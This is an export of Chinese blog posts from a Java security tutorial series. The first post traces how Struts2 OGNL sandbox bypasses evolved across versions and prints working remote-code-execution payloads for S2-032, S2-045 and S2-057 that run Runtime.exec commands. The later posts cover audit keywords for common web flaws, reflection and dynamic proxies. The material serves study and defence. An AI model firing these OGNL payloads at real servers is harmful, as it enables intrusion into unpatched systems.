[{"title":"OGNL攻防史","url":"/2019/02/13/OGNL攻防史/","content":"# 前言\n\n之前基础篇对struts2的框架做了介绍，本篇章将对struts2的原理做个简介。目前struts2已经被阿里巴巴等大厂弃用了，但是作为曾经风靡一时的框架，并且互联网上还有大量的struts2应用，是很有必要学习一番的。\n\n# OGNL表达式\n\nOGNL（Object Graph Navigation Language）即对象图形导航语言，是一个开源的表达式引擎。使用OGNL，你可以通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化。如果我们把表达式看做是一个带有语义的字符串，那么OGNL无疑成为了这个语义字符串与Java对象之间沟通的桥梁。我们可以轻松解决在数据流转过程中所遇到的各种问题。\n\n##OGNL三要素\n\n**Expression(表达式)：**\n\nExpression规定OGNL**要做什么**，其本质是一个带有语法含义的字符串,这个字符串将规定操作的类型和操作的内容。OGNL支持的语法非常强大，从对象属性、方法的访问到简单计算，甚至支持复杂的lambda表达式。\n\n**Root(根对象)：**\n\nOGNL的root对象可以理解为OGNL要操作的对象，表达式规定OGNL要干什么，root则指定对**谁进行操作**。OGNL的root对象实际上是一个java对象，是所有OGNL操作的实际载体。\n\n**Context(上下文)：**\n\n有了表达式和根对象，已经可以使用OGNL的基本功能了。例如，根据表达式对root对象进行getvalue、setvalue操作。不过事实上在OGNL内部，所有的操作都会在一个特定的数据环境中运行，这个数据环境就是OGNL的上下文。**单说就是上下文将规定OGNL的操作在哪里进行。**OGNL的上下文环境是一个MAP结构，定义为OgnlContext，root对象也会被添加到上下文环境中，作为一个特殊的变量进行处理。\n\nOGNL进行对象存取操作的API在Ognl.java文件中，分别是getValue、setValue两个方法。getValue通过传入的OGNL表达式，在给定的上下文环境中，从root对象里取值：\n\n![](/images/a5/1.png)\n\nsetValue通过传入的OGNL表达式，在给定的上下文环境中，往root对象里写值:\n\n![](/images/a5/2.png)\n\n## OGNL基本操作\n\n1. 支持对象方法调用，形式如：objName.methodName()；\n\n2. 支持类静态的方法调用和值访问，表达式的格式为 **@[类全名（包括包路）]@[方法名 | 值名]**，例如：\n\n```java\n@java.lang.String@add（ '11' , 'hahhaha' ）\n```\n\n3. 支持赋值操作和表达式串联，例如：\n\n```java\nnumber=18, price=100,Total()；\n```\n\n那么返回1800；\n\n4. 访问OGNL上下文（OGNL context）其实就是Map （教室、老师、学生）和ActionContext，\n\n   - OgnlContext=根对象(1)+非根对象(N)\n\n     - 老师：根对象 1\n\n     - 学生：非根对象 n\n\n       非根对象要通过**#key**访问，根对象可以省略**#key**\n\n   - **根对象和非根对象的概括**\n\n     - 一个上下文中只有一个根对象\n     - 取跟对象的值，只需要直接通过根对象属性即可\n     - 非根对象取值必须通过指定的上下文容器中的**#key**属性去取。\n\n# OGNL历史\n\nOgnlContext中的_memberAccess与securityMemberAccess是同一个SecurityMemberAccess类的实例，而且内容相同，也就是说全局的OgnlUtil实例都共享着相同的设置。如果利用OgnlUtil更改了设置项（excludedClasses、excludedPackageNames、excludedPackageNamePatterns）则同样会更改_memberAccess中的值。\n\n以下图例左边都是较为新的版本，右边为老版本。\n\n##Struts 2.3.14.1版本前\n\nS2-012、S2-013、S3-014的出现促使了这次更新，可以说在跟新到2.3.14.1版本前，ognl的利用基本属于不设防状态，我们可以看一下这两个版本的diff，不难发现当时还没有出现黑名单这样的说法，而修复的关键在于SecurityMemberAccess：\n\n![](/images/a5/3.png)\n\n左边是2.3.14.1的版本，右边是2.3.14的版本，不难看出在这之前可以通过ognl直接更改allowStaticMethodAccess=true，就可以执行后面的静态方法了，所以当时非常通用的一种poc是：\n\n```java\n(#_memberAccess[‘allowStaticMethodAccess’]=true).(@java.lang.Runtime@getRuntime().exec(‘calc’))\n```\n\n而在2.3.14.1版本后将allowStaticMethodAccess设置成**final属性**后，就不能显式更改了，这样的poc显然也失效了。\n\n##Struts 2.3.20版本前\n\n在2.3.14.1后虽然不能更改allowStaticMethodAccess了，但是还是可以通过_memberAccess使用类的构造函数，并且访问公共函数，所以可以看到当时有一种替代的poc：\n\n```java\n(#p=new java.lang.ProcessBuilder(‘xcalc’)).(#p.start())\n```\n\n直到2.3.20，这样的poc都可以直接使用。在2.3.20后，Struts2不仅仅引入了黑名单（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），更加重要的是阻止了所有构造函数的使用，所以就不能使用ProcessBuilder这个payload了。\n\n##Struts 2.3.29版本前\n\n左为2.3.29版本，右边为2.3.28版本\n\n![](/images/a5/4.png)\n\n从黑名单中可以看到禁止使用了ognl.MemberAccess和ognl.DefaultMemberAccess，而这两个对象其实就是2.3.20-2.3.28版本的通用绕过方法，具体的思路就是利用_memberAccess调用静态对象DefaultMemberAccess，然后用DefaultMemberAccess覆盖_memberAccess。那么为什么说这样就可以使用静态方法了呢？ 我们先来看一下可以在S2-032、S2-033、S2-037通用的poc：\n\n```java\n(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))\n```\n\n我们来看一下ognl.OgnlContext@DEFAULT_MEMBER_ACCESS：\n\n![](https://p5.ssl.qhimg.com/t01ecfd1c68ebe3f988.jpg)\n\n看过上一节的都知道，在程序运行时在setOgnlUtil方法中将黑名单等数据赋给SecurityMemberAccess，而这就是创建_memberAccess的过程，在动态调试中，我们可以看到这两个对象的id甚至都是一样的，而SecurityAccess这个对象的父类本身就是ognl.DefaultMemberAccess，而其建立关系的过程就相当于继承父类并重写父类的过程，所以这里我们利用其父类DefaultMemberAccess覆盖_memberAccess中的内容，就相当于初始化了_memberAccess，这样就可以绕过其之前所设置的黑名单以及限制条件。\n\n##Struts 2.3.30+/2.5.2+\n\n到了2.3.30(2.5.2)之后的版本，我们可以使用的_memberAccess和DefaultMemberAccess都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路：\n\n```java\n(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))\n```\n\n可以看到绕过的关键点在于：\n\n- 利用Ognl执行流程利用container获取了OgnlUtil实例\n- 清空了OgnlUtil$excludedClasses黑名单，释放了DefaultMemberAccess\n- 利用setMemberAccess覆盖\n\n而具体的流程可以参考2.2的内容。\n\n##Struts 2.5.16\n\n分析过S2-057后，你会发现ognl注入很容易复现，但是想要调用静态方法造成代码执行变得很难，我们来看一下Struts2又做了哪些改动：\n\n- 2.5.13版本后禁止访问coontext.map\n\n- 准确来说是ognl包版本的区别，在2.5.13中利用的是3.1.15版本，在2.5.12版本中使用的是3.1.12版本：\n- ![](/images/a5/6.png)\n- 而这个改变是在OgnlContext中：\n- ![](/images/a5/7.png)\n- 不只是get方法，put和remove都没有办法访问了，所以说从根本上禁止了对context.map的访问。\n\n- 2.5.20版本后excludedClasses不可变了，具体的代码在[这里](https://github.com/apache/struts/commit/748da3f8ce6b9f3953bc418745c35a534e5b98ca)\n\n所以在S2-045时可使用的payload已经没有办法再使用了，需要构造新的利用方式。\n\n文章提出了这么一种思路:\n\n- 没有办法使用context.map，可以调用attr，前文说过attr中保存着整个context的变量与方法，可以通过attr中的方法返回给我们一个context.map。\n- 没有办法直接调用excludedClasses，也就不能使用clear方法来清空，但是还可以利用setter来把excludedClasses给设置成空\n- 清空了黑名单，我们就可以利用DefaultMemberAccess来覆盖_memberAccess，来执行静态方法了。\n\n而这里又会出现一个问题，当我们使用OgnlUtil的setExcludedClasses和setExcludedPackageNames将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说_memberAccess是源数据的一个引用，就像前文所说的，在每次createAction时都是通过setOgnlUtil利用全局的源数据创建一个引用，这个引用就是一个MemberAccess对象，也就是_memberAccess。所以这里只会影响这次请求的OgnlUtil而并未重新创建一个新的_memberAccess对象，所以旧的_memberAccess对象仍未改变。\n\n而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的OgnlUitl作为源重新创建一个_memberAccess，这样在第二次请求中_memberAccess就是黑名单被置空的情况，这个时候就释放了DefaultMemberAccess，就可以进行正常的覆盖以及执行静态方法。\n\npoc为：\n\n```java\n(#context=#attr[‘struts.valueStack’].context).(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(”)).(#ognlUtil.setExcludedPackageNames(”))\n\n(#context=#attr[‘struts.valueStack’].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘curl 127.0.0.1:9001’))\n```\n\n\n\n#现阶段的OGNL\n\nStruts2在 2.5.16版本后做了很多修改，截止到写文章的时候，已经更新到2.5.20，接下来我将把这几个版本的区别全部都列出来，并且说明现在绕过Ognl沙箱面临着哪些阻碍。同上一节，左边都为较新的版本，右边为较旧的版本。\n\n##2.5.17的改变（限制命名空间）\n\n1. 黑名单的变动，禁止访问com.opensymphony.xwork2.ognl.\n\n- ![](/images/a5/8.png)\n- 讲道理，2.5.17版本的修补真的是很暴力，直接在黑名单中加上了com.opensymphony.xwork2.ognl.也就是说我们根本没办法访问这个Struts2重写的ognl包了。\n\n1. 切断了动态引用的方式，需要利用构造函数生成\n\n- ![](/images/a5/9.png)\n- 不谈重写了setExcludedClasses和setExcludedPackageNamePatterns，单单黑名单的改进就极大的限制了利用。\n\n##2.5.19的改进\n\n1. ognl包的升级，从3.1.15升级到3.1.21\n\n- ![](/images/a5/10.png)\n\n1. 黑名单改进\n\n- ![](/images/a5/11.png)\n\n1. 在OgnlUtil中setXWorkConverter、setDevMode、setEnableExpressionCache、setEnableEvalExpression、setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames、setContainer、setAllowStaticMethodAccess、setDisallowProxyMemberAccess都从public方法变成了protected方法了：\n\n- ![](/images/a5/12.png)\n- ![](/images/a5/13.png)\n\n也就是说没有办法显式调用setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames了。\n\n##master分支的改变\n\n1. ognl包的升级，从3.1.21升级到3.2.10，直接删除了DefaultMemberAccess.java，同时删除了静态变量DEFAULT_MEMBER_ACCESS，并且_memberAccess变成了final：\n\n- ![](/images/a5/14.png)\n- ![](/images/a5/15.png)\n\n1. SecurityMemberAccess不再继承DefaultMemberAccess而直接转为MemberAccess接口的实现：\n\n- ![](/images/a5/16.png)\n\n可以看到Struts2.5.*基本上是对Ognl的执行做出了重大的改变，DefaultAccess彻底退出了历史舞台意味着利用父类覆盖_memberAccess的利用方式已经无法使用，而黑名单对于com.opensymphony.xwork2.ognl的限制导致我们基本上没有办法利用Ognl本身的API来更改黑名单，同时_memberAccess变为final属性也使得S2-057的这种利用_memberAccess暂时性的特征而进行“重放攻击”的方式测地化为泡影。\n\n\n\n参考：\n\nhttps://blog.csdn.net/pngyul/article/details/82723719\n\nhttps://www.anquanke.com/post/id/169735#h3-4\n\nhttps://www.cnblogs.com/huangting/p/11105051.html","tags":["OGNL","Struts2"],"categories":["JAVA安全教程"]},{"title":"JAVA常见WEB漏洞审计","url":"/2019/02/02/JAVA常见WEB漏洞审计/","content":"# 简介\n\n本篇将介绍java web的内容，其实sql，xss等多数漏洞和其他的语言类似，所以不对具体的漏洞原理做分析，本文主要就是对审计关键字的提炼。学习java web具体代码程序的触发过程，不仅可以加深对漏洞的理解，如果你需要从事代码审计等工作，都会有很大的帮助。详细的代码可参考：https://github.com/JoyChou93/java-sec-code。\n\n# SQL漏洞\n\njava产生的漏洞形式主要有两种：\n\n1. 和其他语言一样，通过拼接字符串导致sql\n\n2. 使用myhabits数据库时，用${}拼接了字符串\n\n   ![](/images/a4/1.png)\n\n**审计：**\n\n1. 查看配置文件确定使用的数据库有哪些\n2. 查看所有的controller，看是存在数据库操作的动作\n3. 查看mapper，看是否使用了字符串拼接或者${}\n4. 上述都不管用的时候，直接搜select *等关键字，看具体数据库怎么操作的\n\n# XSS漏洞\n\n这个和其他语言都一样。\n\n**审计：**\n\n1. 查看所有的controller，看返回是否有把未过滤的字符返回给前端\n\n# 命令注入\n\n主要有下面两种两种方法\n\n```java\nRuntime.getRuntime().exec(cmds);\nnew ProcessBuilder(cmds).start();\n```\n\n**审计：**\n\n1. 全局搜索关键字 getRuntime.exec( 和 ProcessBuilder().start\n\n# SSIT\n\njava模板注入，主要是由两个组件velocity和freemarker产生的。\n\n**审计：**\n\n1. 可以查看pom.xml中是否使用了上述两种组件\n2. 全局搜关键字 new VelocityContext( 和 new StringTemplateLoader( \n\n# 重定向漏洞\n\n主要有三种：\n\n1. redirect(@RequestParam(\"url\")\n2. response.setHeader(\"Location\", url);\n3. response.sendRedirect(url); \n\n**审计：**\n\n1. 全局搜索上面三个函数 redirect(, reponse.setHeader(, response.sendRedirect\n\n# 目录穿越漏洞\n\n查看所有controller查找文件相关的操作。\n\n**审计：**\n\n1. 查找 new File( 等关键字\n\n# SSRF漏洞\n\n查看所有controller操作url相关的函数，查找如下一些关键字。\n\n**审计**：\n\n1. new URL(\n2. urlConnection.getInputStream(\n3. HttpURLConnection\n4. Request.Get(\n5. .openStream(\n\n# 文件上传漏洞\n\n查看所有controller有关上传操作的函数，查找如下一些关键字\n\n**审计：**\n\n1. .getOriginalFilename(\n2. .write(\n3. new File(\n\n# XXE漏洞\n\njava解析xml的格式比较多，整理如下关键字\n\n**审计：**\n\n1. XMLReaderFactory.createXMLReader\n2. new SAXBuilder(\n3. new SAXReader(\n4. SAXParserFactory.newInstance(\n5. new Digester(\n6. DocumentBuilderFactory.newInstance(\n","tags":["JAVA","web漏洞","代码审计"],"categories":["JAVA安全教程"]},{"title":"JAVA反射与动态代理","url":"/2019/01/28/JAVA反射与动态代理/","content":"# JAVA反射\n\n## 什么是Java反射\n\n反射是Java的特征之一，是一种**间接操作目标对象的机制**，核心是JVM在运行的时候才动态加载类，并且对于任意一个类，都能够知道这个类的所有属性和方法，调用方法/访问属性，不需要提前在编译期知道运行的对象是谁，他允许运行中的Java程序获取类的信息，并且可以操作类或对象内部属性。程序中对象的类型一般都是在编译期就确定下来的，而当我们的程序在运行时，可能需要动态的加载一些类，这些类因为之前用不到，所以没有加载到jvm，这时，使用Java反射机制可以在**运行期动态的创建对象并调用其属性**，它是在运行时根据需要才加载。\n<!-- more -->\n## 反射的原理\n\n![](/images/a2/1.png)\n\n## 反射的优缺点\n\n**优点：**使用反射，我们就可以在运行时获得类的各种内容，进行反编译，对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。\n\n**缺点：**\n\n1. 反射会消耗一定的系统资源，因此，如果不需要动态地创建一个对象，那么就不需要用反射；\n2. 反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。\n\n## 反射的用途\n\n1. 反编译：.class-->.java\n2. 通过反射机制访问java对象的属性，方法，构造方法等\n3. 当我们在使用IDEA时，当我们输入一个对象或者类，并想调用他的属性和方法是，一按点号，编译器就会自动列出他的属性或者方法，这里就是用到反射。\n4. 反射最重要的用途就是开发各种通用框架。比如很多框架（Spring）都是配置化的（比如通过XML文件配置Bean），为了保证框架的通用性，他们可能需要根据配置文件加载不同的类或者对象，调用不同的方法，这个时候就必须使用到反射了，运行时动态加载需要的加载的对象。\n\n## 反射机制常用的类\n\n```Java\nJava.lang.reflect.Constructor;\nJava.lang.reflect.Field;\nJava.lang.reflect.Method;\nJava.lang.reflect.Modifier;\n```\n\n## 反射的基本使用\n\n- Object.getclass()   //需要创建对象\n\n- Object.class    //需要导入对应的类包\n\n- Class.forName    //最常用\n\n**代码实例：**\n\n1、创建一个需要被反射的测试类\n\n```java\nimport static java.lang.System.out;\nimport java.lang.String;\n\npublic class User {\n    private String username;\n    public String interest;\n\n    public User() {\n        ;\n    }\n\n    private User(String name) {\n        System.out.println(\"init.\");\n    }\n\n    public String getUsername(){\n        return username;\n    }\n\n    public void setUsername(String username){\n        this.username = username;\n    }\n\n    public String getInterest(){\n        return interest;\n    }\n\n    public void setInterest(String interest){\n        this.interest = interest;\n    }\n\n    public static void main(String args[]) {\n        User userinfo = new User();\n        userinfo.setUsername(\"xiaoming\");\n        out.println(userinfo.getUsername());\n    }\n}\n```\n\n2、反射调用User类\n\n```java\nimport java.lang.reflect.*;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.System;\nimport java.lang.String;\n\npublic class Reflect {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {\n        Class clazz = Class.forName(\"User\"); //包路径，这里测试写在同目录\n\n        System.out.println(\"===获取公共的构造函数===\");\n        Constructor[] constructors = clazz.getConstructors();\n        for (Constructor constructor: constructors)\n            System.out.println(constructor);\n\n        System.out.println(\"===获取所有的构造函数===\");\n        Constructor[] declaredConstructors = clazz.getDeclaredConstructors();\n        for (Constructor constructor: declaredConstructors)\n            System.out.println(constructor);\n\n        System.out.println(\"===获取公共的属性===\");\n        Field[] fields = clazz.getFields();\n        for (Field field: fields)\n            System.out.println(field);\n\n        System.out.println(\"===获取所有的属性===\");\n        Field[] declaredFields = clazz.getDeclaredFields();\n        for (Field field: declaredFields)\n            System.out.println(\"ALL: \" + field);\n        \n        System.out.println(\"===获取特定的函数===\");\n        Method method = clazz.getDeclaredMethod(\"setUsername\", String.class);\n        System.out.println(method);\n\n        //赋值操作\n        Object obj = clazz.getConstructor().newInstance();\n        Object invoke = method.invoke(obj, new String[]{\"我是科比\"});\n\n        System.out.println(\"===测试===\");\n        String name= (String) clazz.getDeclaredMethod(\"getUsername\").invoke(obj);\n        System.out.println(name);\n    }\n}\n```\n\n![](/images/a2/2.png)\n\n这个只做了部分的测试，get\\_系列方法的是获取公用，getDeclared\\_系列方法获取所有，get_(参数)系列获取特定的。如果需要查看所有的方法，可以查看官方文档，或者IDEA跟进Class.java文件查看。这边需要注意的是 method.invoke(obj, args) ，**如果method是静态方法，obj是可以省略的。**\n\n# JAVA动态代理\n\n## 代理模式简介\n\n代理模式是一种常用的设计模式。代理模式为其对象提供了一种代理以控制对这个对象的访问。代理模式可以将主要业务与次要业务进行松耦合的组装。根据代理类的创建时机和创建方式的不同，可以将其分为静态代理和动态代理两种形式：\n\n- 在程序运行前就已经存在的编译好的代理类是为静态代理，\n- 在程序运行期间根据需要动态创建代理类及其实例来完成具体的功能是为动态代理。\n\n## 动态代理简介\n\n对代理模式而言，一般来说，具体主题类与其代理类是一一对应的，这也是静态代理的特点。但是，也存在这样的情况：有N个主题类，但是代理类中的“预处理、后处理”都是相同的，仅仅是调用主题不同。那么，若采用静态代理，必然需要手动创建N个代理类，这显然让人相当不爽。动态代理则可以简单地为各个主题类分别生成代理类，**共享“预处理，后处理”功能**，这样可以大大减小程序规模，这也是动态代理的一大亮点。\n\n在动态代理中，代理类是在运行时期生成的。因此，相比静态代理，动态代理可以很方便地对委托类的相关方法进行统一增强处理，如添加方法调用次数、添加日志功能等等。\n\n### JDK动态代理机制的相关类与接口\n\n**java.lang.reflect.Proxy：**该类用于动态生成代理类，只需传入被监控对象隶属的类文件在内存中真实地址、被监控对象隶属的类文件实现接口以及InvocationHandler通知对象便可为目标接口生成代理类及代理对象。\n\n```\n// 方法 1: 该方法用于获取指定代理对象所关联的InvocationHandler static InvocationHandler\ngetInvocationHandler(Object proxy)\n\n// 方法 2：该方法用于获取关联于指定类装载器和一组接口的动态代理类的类对象 static Class\ngetProxyClass(ClassLoader loader, Class[] interfaces)\n\n// 方法 3：该方法用于判断指定类是否是一个动态代理类 static boolean isProxyClass(Class cl)\n\n// 方法 4：该方法用于为指定类装载器、一组接口及调用处理器生成动态代理类实例 static Object\nnewProxyInstance(ClassLoader loader, Class[] interfaces,\nInvocationHandler h)\n```\n\n**java.lang.reflect.InvocationHandler：**该接口包含一个invoke方法，通过该方法实现对委托类的代理的访问，是代理类完整逻辑的集中体现，包括要切入的增强逻辑和进行反射执行的真实业务逻辑。\n\n```\nObject invoke(Object proxy, Method method, Object[] args)\n```\n\n该方法是代理类完整逻辑的集中体现。在被监控行为将要执行时，会被JVM拦截。被监控行为和行为实现方法会被作为参数输送invoke，通常通过反射完成对具体角色业务逻辑的调用，并对其进行增强。\n\n- 第一个参数既是代理类实例。\n- 第二个参数是被调用的方法对象。\n- 第三个方法是调用参数。\n\n**java.lang.ClassLoader：**类加载器类，负责将类的字节码装载到Java虚拟机中并为其定义类对象，然后该类才能被使用。Proxy静态方法生成动态代理类同样需要通过类加载器来进行加载才能使用，它与普通类的唯一区别就是其字节码是由JVM在运行时动态生成的而非预存在于任何一个.class 文件中。JDK动态代理使用步骤\n\n### JDK动态代理的一般步骤\n\n1、创建被代理的接口和类；\n\n2、实现InvocationHandler接口，对目标接口中声明的所有方法进行统一处理；\n\n3、调用Proxy的静态方法，创建代理类并生成相应的代理对象；\n\n4、使用代理。\n\n### 生活案例\n\n**饭前便后要洗手**\n一、分析出主要业务和次要业务\n【主要业务】：吃饭，上厕所\n【次要业务】：洗手\n\n二、JDK代理模式实现\n\n1. 接口角色： 定义所有需要被监听行为\n2. 接口实现类：中国人、印度人\n3. 通知类：\n   - 次要业务进行具体实现\n   - 通知JVM，当前被拦截的主要业务方法与次要业务方法应该如何绑定执行\n\n4. 监控对象（代理对象）\n   - 被监控实例对象 需要被监控的行为\n   - 具体通知类实例对象\n\n### 代码实现\n\n1、定义接口类\n\n```java\npublic interface BaseService {\n    void eat();\n    void wc();\n}\n```\n\n2、编写接口的实现类，即具有某些行为的实体\n\n```java\npublic class Person implements BaseService {\n\n    @Override\n    public void eat() { //主要业务，代理模式要求开发人员只关心主要业务\n        System.out.println(\"吃饭.\");\n    }\n\n    @Override\n    public void wc() {\n        System.out.println(\"上厕所.\");\n    }\n}\n```\n\n3、创建通知类\n\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\n\npublic class Invocation implements InvocationHandler {\n\n    private BaseService obj;//具体被监控对象\n\n    public Invocation(BaseService param){\n        this.obj = param;\n    }\n\n    /*\n     *\n     *  invoke方法：在被监控行为将要执行时，会被JVM拦截\n     *             被监控行为和行为实现方会被作为参数输送invoke\n     *             ****\n     *             通知JVM,这个被拦截方法是如何与当前次要业务方法绑定实现\n     *  invoke方法三个参数\n     *\n     *           int v= 小明.eat();//JVM拦截\n     *            eat方法封装为Mehtod类型对象\n     *            eat方法运行时接受所有的实参封装到Object[]\n     *            将负责监控小明的代理对象作为invoke方法第一个参数\n     *\n     */\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] params) throws Throwable {\n        //1.局部变量，接受主要业务方法执行完毕后返回值\n        Object value;\n        //2.确认当前被拦截行为\n        String methodName= method.getName();\n        //3.根据被拦截行为不同，决定主要业务和次要业务如何绑定执行\n        if(\"eat\".equals(methodName)){//饭前要洗手\n            wash();                            //洗手\n            value=method.invoke(this.obj, params);   //吃饭\n        }else{//便后要洗手\n            value=method.invoke(this.obj, params);\n            wash();\n        }\n        return value; //返回被拦截方法，需要调用地方\n    }\n\n    //次要业务\n    public void wash(){\n        System.out.println(\"-----洗手----\");\n    }\n}\n```\n\n4、创建监控对象，通过Proxy类的静态方法newProxyInstance创建代理对象\n\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\n\nclass ProxyFactory {\n    /*\n     *\n     *  JDK动态代理模式下，代理对象的数据类型\n     *  应该由监控行为来描述\n     *  参数： Class文件，监控类\n     */\n    public static BaseService Builder(Class classFile) throws Exception {\n\n        //1.创建被监控实例对象\n        BaseService obj = (BaseService) classFile.newInstance();\n        //2.创建一个通知对象 用接口来描述\n        InvocationHandler adviser = new Invocation(obj);\n        //3.向JVM申请负责监控obj对象指定行为的监控对象（代理对象）\n        /*\n         *  loader:被监控对象隶属的类文件在内存中真实地址\n         *  interfaces:被监控对象隶属的类文件实现接口\n         *  adviser：监控对象发现小明要执行被监控行为，应该由哪一个通知对象进行辅助\n         */\n        BaseService $proxy = (BaseService) Proxy.newProxyInstance(\n                obj.getClass().getClassLoader(),\n                obj.getClass().getInterfaces(),\n                adviser);\n        return $proxy;\n    }\n}\n```\n\n5、测试\n\n```java\nimport java.lang.*;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        BaseService mike= ProxyFactory.Builder(Person.class);\n        mike.eat();\n        System.out.println(\"================\");\n        mike.wc();\n    }\n}\n```\n\n![](/images/a2/3.png)\n\n\n\n# JAVA动态字节码\n\n## 动态字节码技术\n\nJava 代码都是要被编译成字节码后才能放到 JVM 里执行的，而字节码一旦被加载到虚拟机中，就可以被解释执行。字节码文件（.class）就是普通的二进制文件，它是通过 Java 编译器生成的。而只要是文件就可以被改变，**如果我们用特定的规则解析了原有的字节码文件，对它进行修改或者干脆重新定义，这不就可以改变代码行为了么**。动态字节码技术优势在于 Java 字节码生成之后，对其进行修改，增强其功能，这种方式相当于对应用程序的二进制文件进行修改。\n\n通过动态编程的方式，我可以直接对已经存在的java字节码进行操作，也可以在内存中动态生成JAVA代码，动态编译执行，在安全中常用于生成payload，这种方式生成的payload优点：**能够注入pure-java的shell来绕过java原生的安全防护。**\n\nJava 生态里有很多可以动态处理字节码的技术，比较流行的有两个，一个是 ASM，一个是 Javassist 。\n\n- ASM：直接操作字节码指令，执行效率高，但涉及到JVM的操作和指令，要求使用者掌握Java类字节码文件格式及指令，对使用者的要求比较高。\n\n- Javassist：提供了更高级的API，执行效率相对较差，但无需掌握字节码指令的知识，简单、快速，对使用者要求较低。\n\n## Javassist简介\n\nJavassist 是一个开源的分析、编辑和创建Java字节码的类库。其主要的优点，**在于简单，而且快速。直接使用 java 编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。**\n\nJavassist 中最为重要的是 **ClassPool，CtClass ，CtMethod 以及 CtField** 这几个类。\n\n```\nClassPool：一个基于 Hashtable 实现的 CtClass 对象容器，其中键是类名称，值是表示该类的 CtClass 对象。\nCtClass：CtClass 表示类，一个 CtClass (编译时类）对象可以处理一个 class 文件，这些 CtClass 对象可以从 ClassPool 获得。\nCtMethods：表示类中的方法。\nCtFields ：表示类中的字段。\n```\n\n下面以简单的一个实例来说明下基本的使用方法。这个实例是在执行完类中的方法时候加入一些操作。\n\n1、定义个测试类User\n\n```java\npackage com.demo.manba;\n\nimport java.lang.String;\n\npublic class User {\n    private String name;\n\n    public User() {\n    }\n\n    public String getUser() {\n        return this.name;\n    }\n\n    public void setUser(String name) {\n        this.name = name;\n    }\n\n}\n```\n\n2、 执行\n\n```java\npackage com.demo.manba;\n\nimport javassist.*;\nimport java.lang.reflect.InvocationTargetException;\n\npublic class DynGenerateClass {\n    public static void main(String[] args) throws NotFoundException, CannotCompileException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {\n            // 获取默认池\n            ClassPool pool = ClassPool.getDefault();\n            CtClass cc = pool.get(\"com.demo.manba.User\");\n            // 获取所有方法\n            CtMethod[] cms = cc.getDeclaredMethods();\n            for(CtMethod cm:cms){\n                System.out.println(cm.getName());\n            }\n            // 在执行setUser方法后执行\n            cms[1].insertAfter(\"System.out.println(\\\"I hava execute setUser Success.\\\");\");\n            Class clazz = cc.toClass();\n            // 实例化\n            User u=(User) clazz.getConstructor(new Class[]{}).newInstance(new Object[]{});\n            u.setUser(\"mike\");\n            System.out.println(u.getUser());\n            // cc.writeFile();\n        }\n\n}\n```\n\n输出\n\n![](/images/a2/4.png)\n\n**参考：**\n\nhttps://blog.csdn.net/a745233700/article/details/82893076\n\nhttps://blog.csdn.net/vae1314chuanchen/article/details/87974728\n\nhttps://blog.csdn.net/justloveyou_/article/details/79407248\n\nhttps://blog.csdn.net/vae1314chuanchen/article/details/78266299\n","tags":["JAVA","动态代理","反射"],"categories":["JAVA安全教程"]},{"title":"JAVA框架介绍","url":"/2018/12/04/JAVA框架介绍/","content":"# 什么是框架\n\n在编程领域，软件框架是指一种抽象形式，它提供了一个具有通用功能的软件，这些功能可以由使用者编写代码来有选择的进行更改，从而提供服务于特定应用的软件。软件框架提供了一种标准的方式来构建并部署应用。\n<!-- more -->\n# Struts2框架介绍\n\n直接上图\n\n![](/images/a3/1.png)\n\nStruts2框架最主要的两个组件就是过滤器和拦截器，其中用到的思想就是上一章的反射和动态代理。\n\n**工作流程：**\n\n1. 客户端浏览器发送HTTP请求到Web应用\n2. Web容器将请求传递到标准ActionContextCleanUp过滤器以消除属性，而不让后续过滤器清楚，以延长Action中属性（包括自定义属性）的生命周期。\n3. 再经过如stimesh等其他过滤器后，请求传递给StrutsPrepareAndExecuteFilter核心控制器\n4. StrutsPrepareAndExecuteFilter调用ActionMapper（Action映射器）确定调用哪个Action，再将控制权转移给ActionProxy代理\n5. ActionProxy代理调用配置管理器ConfigurationManager从配置文件struts.xml中读取配置信息，然后创建ActionInvocation对象\n6. ActionInvocation在调用拦截器链中的拦截器后再调用Action，根据Action返回的结果字符串查找对应的Result\n7. Result调用视图模板，再以相反的顺序执行拦截器链，返回HTTP响应\n8. HTTP响应以相反的顺序返回给核心控制器StrutsPrepareAndExecuteFilter以及其他web.xml中定义的过滤器，最终返回给客户端\n\nstruts2可以说是上一代的web框架，现在基本很少互联网会使用strust2，一来安全问题较多，二来现在有更方便的springboot框架，基本可以说被遗弃了。但是作为安全学习，我们还是有必要了解下基本的框架体系，如果想要深入的学习，可以网上自己搜索，作为曾经火遍大江南北的web框架，网上资料还是很多的。\n\n# 